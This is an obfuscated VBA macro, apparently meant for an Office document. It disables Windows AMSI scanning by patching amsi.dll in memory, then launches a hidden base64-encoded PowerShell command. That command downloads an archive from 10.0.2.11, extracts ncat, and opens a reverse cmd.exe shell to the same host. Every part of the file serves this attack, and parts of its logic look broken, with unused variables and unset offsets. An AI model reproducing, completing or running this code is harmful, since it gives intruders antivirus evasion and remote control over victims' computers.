Private Declare PtrSafe Function thltovkf Lib "kernel32" Alias "GetProcAddress" (ByVal hlhjsdgrkpgsywmggtjw As LongPtr, ByVal wupskhmryjciczkww As String) As LongPtr
Private Declare PtrSafe Function hzkvcqdweijxfykuopln Lib "kernel32" Alias "LoadLibraryA" (ByVal emnkoydcekjvjztvm As String) As LongPtr
Private Declare PtrSafe Function giaggzhhthzhivm Lib "kernel32" Alias "VirtualProtect" (ueivfsssdsmbuzm As Any, ByVal htsfrkhksg As LongPtr, ByVal igjdbmdyejjp As Long, wmchghqzozu As Long) As Long
Private Declare PtrSafe Sub oopynkfcibgpcshqry Lib "kernel32.dll" Alias "RtlFillMemory" (cmqphvpzjg As Any, ByVal ocqczafpogs As Long, ByVal mjvyxkyshf As Byte)
Declare PtrSafe Sub whilyjxuqejxemo Lib "msvcrt" Alias "memcpy" (ByRef dhypuqtpetvwgbov As Any, ByRef mvtnywszmdzpy As Any, ByVal tncnjtccwiooqmdabma As Long)
Private Declare PtrSafe Function zvlagnbsfxhahnuh Lib "kernel32" Alias "CreateProcessA" (ByVal xzbiamubkebwm As String, ByVal byfbpijdxt As String, gmgajfksuhr As Any, buuoetliqtl As Any, ByVal eedugnmw As Long, ByVal advtijeh As Long, sxyozvdae As Any, ByVal icytdsaazdgemtkht As String, lpStartupInfo As qlgmumdempjn, lpProcessInformation As tljitdaizh) As Long
Private Declare PtrSafe Function yhykerpqg Lib "kernel32.dll" Alias "OpenProcess" (ByVal obkxhxhhjwyikhjgkzb As Long, ByVal rsmixascpfostyxj As Integer, ByVal amisyilrn As Long) As Long
Private Declare PtrSafe Function adlupmfbldjamlslk Lib "kernel32" Alias "TerminateProcess" (ByVal vtykpjmggfhepvz As Long, ByVal jxanlqqqpbgdxzyl As Long) As Long
Private Declare PtrSafe Function byaeussrvfj Lib "kernel32" Alias "CloseHandle" (ByVal amisyilrn As Long) As Long
Private Type tljitdaizh
vtykpjmggfhepvz As Long
jlbpwmapkcjc As Long
pohdiejbfminlktdfgg As Long
wlhfewnbtoizkwlnfsbg As Long
End Type
Private Type qlgmumdempjn
wbsrtwvswmoujkcxwl As Long
ymhvmecjeivaopoq As String
cfsblplpnnfoiaqzvjw As String
vhelihikop As String
ggmucuzovdjxtwsbzxzq As Long
soeosscnxuwdep As Long
cliehjdlv As Long
pztahhjtfjfwyocolugq As Long
hsuuwrfnhfjwzwhixrbm As Long
ipjoscezwcza As Long
alfvytilyqztcebyawn As Long
ptfbwewbuk As Long
owuofnroyic As Integer
svsuzcnrsepxmqtysyi As Integer
wzhbjyqxmo As Long
bopbrykcrmnkuqjdo As Long
jhpcxfwvgjciupds As Long
ncxzbsjjgdxlo As Long
End Type
Const mrjcocntmxkxhwizbsxh = &H8000000
Const vozyqrcgvqnftakjs = &H10
Function szbqgizbsmxgauoamdv(aqwkfyfgztiro As String, ukhujclb As String) As LongPtr
Dim foxixkrlnhy As LongPtr
AmsiDLL = hzkvcqdweijxfykuopln(aqwkfyfgztiro)
LoadDll = thltovkf(foxixkrlnhy, ukhujclb)
End Function
Function mfuklfhrttxoitvi(cbbxtzntmbdwvwmivvc As LongPtr, hcnqwbqjluuxxaaas As Integer) As String
Dim mlolclpsedqo As String
Dim exuqsfesrrihf As LongPtr
Dim fnypkbybjpm As LongPtr
On Error Resume Next
TraverseStartAddr = cbbxtzntmbdwvwmivvc - hcnqwbqjluuxxaaas
Dim dfptpacegqmtvyggl As Integer
For dfptpacegqmtvyggl = 0 To hcnqwbqjluuxxaaas
whilyjxuqejxemo exuqsfesrrihf, ByVal (fnypkbybjpm + dfptpacegqmtvyggl), 1
If exuqsfesrrihf < 16 Then
FixedByteString = zdzawrkawkfn("30") & Hex(exuqsfesrrihf)
mlolclpsedqo = mlolclpsedqo & FixedByteString
Else
mlolclpsedqo = mlolclpsedqo & Hex(exuqsfesrrihf)
End If
Next dfptpacegqmtvyggl
GetBuffer = mlolclpsedqo
End Function
Function himyjhalczqlaiko(cbbxtzntmbdwvwmivvc As LongPtr, hcnqwbqjluuxxaaas As Integer, jplrcxel As Integer) As LongPtr
Dim zjujkgldbuyehrpswg As Integer
memOffset = (jplrcxel - 1) / 2
FindPatchOffset = (cbbxtzntmbdwvwmivvc - hcnqwbqjluuxxaaas) + zjujkgldbuyehrpswg
End Function
Sub smlulwzhcrnpf()
Dim cbbxtzntmbdwvwmivvc As LongPtr
Dim mefjcgryyqyv As String
Dim yqxvqndndhyuwyozjzu As String
Dim mlolclpsedqo As String
Dim nctsxickvi As LongPtr
Dim idkkcrnmkxmykeki As LongPtr
Dim jqtravpavgqpnkiscbc As Integer
Dim jplrcxel As Integer
Dim ysoiuqetebsclrofxf As Integer
ScanBufferMagicBytes = zdzawrkawkfn("3443384244433439383935") & zdzawrkawkfn("423038")
ScanStringMagicBytes = zdzawrkawkfn("34383833454333383435") & zdzawrkawkfn("33334442")
TrvOffset = 352
Success = 0
LeakedAmsiDllAddr = szbqgizbsmxgauoamdv(zdzawrkawkfn("616d73692e") & zdzawrkawkfn("646c6c"), zdzawrkawkfn("416d7369556163496e69") & zdzawrkawkfn("7469616c697a65"))
LeakedBytesBuffer = mfuklfhrttxoitvi(cbbxtzntmbdwvwmivvc, jqtravpavgqpnkiscbc)
InstructionInStringOffset = InStr(mlolclpsedqo, mefjcgryyqyv)
If jplrcxel = 0 Then
Else
nctsxickvi = himyjhalczqlaiko(cbbxtzntmbdwvwmivvc, jqtravpavgqpnkiscbc, jplrcxel)
Result = giaggzhhthzhivm(ByVal nctsxickvi, 32, 64, 0)
oopynkfcibgpcshqry ByVal (nctsxickvi + 0), 1, Val(zdzawrkawkfn("2648") & zdzawrkawkfn("3930"))
oopynkfcibgpcshqry ByVal (nctsxickvi + 1), 1, Val(zdzawrkawkfn("2648") & zdzawrkawkfn("4333"))
ysoiuqetebsclrofxf = ysoiuqetebsclrofxf + 1
End If
InstructionInStringOffset = InStr(mlolclpsedqo, yqxvqndndhyuwyozjzu)
If jplrcxel = 0 Then
Else
idkkcrnmkxmykeki = himyjhalczqlaiko(cbbxtzntmbdwvwmivvc, jqtravpavgqpnkiscbc, jplrcxel)
Result = giaggzhhthzhivm(ByVal idkkcrnmkxmykeki, 32, 64, 0)
oopynkfcibgpcshqry ByVal (idkkcrnmkxmykeki + 0), 1, Val(zdzawrkawkfn("2648") & zdzawrkawkfn("3930"))
oopynkfcibgpcshqry ByVal (idkkcrnmkxmykeki + 1), 1, Val(zdzawrkawkfn("2648") & zdzawrkawkfn("4333"))
ysoiuqetebsclrofxf = ysoiuqetebsclrofxf + 1
End If
If ysoiuqetebsclrofxf = 2 Then
Call lyegykij
End If
End Sub
Sub bpaxbhbmcpmzfqpfi()
Dim cbbxtzntmbdwvwmivvc As LongPtr
Dim mefjcgryyqyv As String
Dim yqxvqndndhyuwyozjzu As String
Dim mlolclpsedqo As String
Dim nctsxickvi As LongPtr
Dim idkkcrnmkxmykeki As LongPtr
Dim jqtravpavgqpnkiscbc As Integer
Dim jplrcxel As Integer
Dim ysoiuqetebsclrofxf As Integer
ScanBufferMagicBytes = zdzawrkawkfn("3842343530433835433037") & zdzawrkawkfn("34354138354442")
ScanStringMagicBytes = zdzawrkawkfn("38423535304338") & zdzawrkawkfn("3544323734333438333744")
TrvOffset = 300
Success = 0
LeakedAmsiDllAddr = szbqgizbsmxgauoamdv(zdzawrkawkfn("616d73") & zdzawrkawkfn("692e646c6c"), zdzawrkawkfn("416d") & zdzawrkawkfn("7369556163496e697469616c697a65"))
LeakedBytesBuffer = mfuklfhrttxoitvi(cbbxtzntmbdwvwmivvc, jqtravpavgqpnkiscbc)
InstructionInStringOffset = InStr(mlolclpsedqo, mefjcgryyqyv)
If jplrcxel = 0 Then
Else
nctsxickvi = himyjhalczqlaiko(cbbxtzntmbdwvwmivvc, jqtravpavgqpnkiscbc, jplrcxel)
Debug.Print Hex(nctsxickvi)
Result = giaggzhhthzhivm(ByVal nctsxickvi, 32, 64, 0)
oopynkfcibgpcshqry ByVal (nctsxickvi + 0), 1, Val(zdzawrkawkfn("2648") & zdzawrkawkfn("3930"))
oopynkfcibgpcshqry ByVal (nctsxickvi + 1), 1, Val(zdzawrkawkfn("2648") & zdzawrkawkfn("3331"))
oopynkfcibgpcshqry ByVal (nctsxickvi + 2), 1, Val(zdzawrkawkfn("2648") & zdzawrkawkfn("4330"))
ysoiuqetebsclrofxf = ysoiuqetebsclrofxf + 1
End If
InstructionInStringOffset = InStr(mlolclpsedqo, yqxvqndndhyuwyozjzu)
If jplrcxel = 0 Then
Else
idkkcrnmkxmykeki = himyjhalczqlaiko(cbbxtzntmbdwvwmivvc, jqtravpavgqpnkiscbc, jplrcxel)
Debug.Print Hex(idkkcrnmkxmykeki)
Result = giaggzhhthzhivm(ByVal idkkcrnmkxmykeki, 32, 64, 0)
oopynkfcibgpcshqry ByVal (idkkcrnmkxmykeki + 0), 1, Val(zdzawrkawkfn("2648") & zdzawrkawkfn("3930"))
oopynkfcibgpcshqry ByVal (idkkcrnmkxmykeki + 1), 1, Val(zdzawrkawkfn("2648") & zdzawrkawkfn("3331"))
oopynkfcibgpcshqry ByVal (idkkcrnmkxmykeki + 2), 1, Val(zdzawrkawkfn("2648") & zdzawrkawkfn("4432"))
ysoiuqetebsclrofxf = ysoiuqetebsclrofxf + 1
End If
If ysoiuqetebsclrofxf = 2 Then
Call lyegykij
End If
End Sub
Sub ekqgsohsghffoaacuuw()
#If Win64 Then
Call smlulwzhcrnpf
#ElseIf Win32 Then
Call bpaxbhbmcpmzfqpfi
#End If
End Sub
Sub lyegykij()
Dim pInfo As tljitdaizh
Dim sInfo As qlgmumdempjn
Dim slvdjzibfs As String
Dim zxatjtddaivxbzvxppkt As Long
Dim bwssjttwlvtikx As Long
lSuccess = zvlagnbsfxhahnuh(slvdjzibfs, "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AdwBpAG4AZABvAHcAcwB0AHkAbABlACAAaABpAGQAZABlAG4AIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIABoAHQAdABwADoALwAvADEAMAAuADAALgAyAC4AMQAxADoAOAAwADAAMAAvAG0AeQAuAHoAaQBwACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAbQB5AC4AegBpAHAAOwBFAHgAcABhA" & "G4AZAAtAEEAcgBjAGgAaQB2AGUAIAAtAFAAYQB0AGgAIABDADoAXABtAHkALgB6AGkAcAAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuAFAAYQB0AGgAIABDADoALwBtAHkAOwAgAHIAbQAgAEMAOgBcAG0AeQAuAHoAaQBwADsAIABDADoAXABtAHkAXABuAGMAYQB0AC4AZQB4AGUAIAAtAG4AdgAgADEAMAAuADAALgAyAC4AMQAxACAANQA1ADUANQAgAC0AZQAgAGMAbQBkAC4AZQB4AGUA", ByVal 0&, ByVal 0&, 1&, vozyqrcgvqnftakjs, ByVal 0&, slvdjzibfs, sInfo, pInfo)
lRetValue = byaeussrvfj(pInfo.jlbpwmapkcjc)
lRetValue = byaeussrvfj(pInfo.vtykpjmggfhepvz)
End SubPrivate Function zdzawrkawkfn(ByVal dtezecedziyb As String) As String
Dim vpiunionmrzy As Long
For vpiunionmrzy = 1 To Len(dtezecedziyb) Step 2
zdzawrkawkfn = zdzawrkawkfn & Chr$(Val("&H" & Mid$(dtezecedziyb, vpiunionmrzy, 2)))
Next vpiunionmrzy
End Function
